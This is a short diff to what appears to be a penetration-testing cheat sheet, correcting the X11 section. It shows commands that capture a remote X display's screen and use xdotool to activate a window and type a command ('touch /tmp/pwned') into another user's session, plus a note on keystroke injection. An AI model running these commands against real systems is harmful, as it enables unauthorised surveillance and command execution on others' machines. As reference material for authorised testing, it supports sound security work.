@@ -92,11 +92,13 @@ xwd -root -screen -silent -display <IP>:0 > screen.xwd
 convert screen.xwd screen.png
 ```
 ```bash
-WID=$(xdotool search --onlyvisible --name '.*' --display <IP>:0 | head -n1)
-xdotool windowactivate --sync --display <IP>:0 "$WID"
-xdotool type --delay 50 --display <IP>:0 'touch /tmp/pwned'
-xdotool key --display <IP>:0 Return
+export DISPLAY=<IP>:0
+WID=$(xdotool search --onlyvisible --name '.*' | head -n1)
+xdotool windowactivate --sync "$WID"
+xdotool type --delay 50 'touch /tmp/pwned'
+xdotool key Return
 ```
+- `xdotool` has no `--display` option: it uses `DISPLAY`.
 - `xdotool type` into a reactivated window (e.g. an open terminal) injects keystrokes as whoever is logged into that session — activate the window first, `--window` targeting alone is unreliable (`XSendEvent` delivery).
 
 ## MQTT: 1883
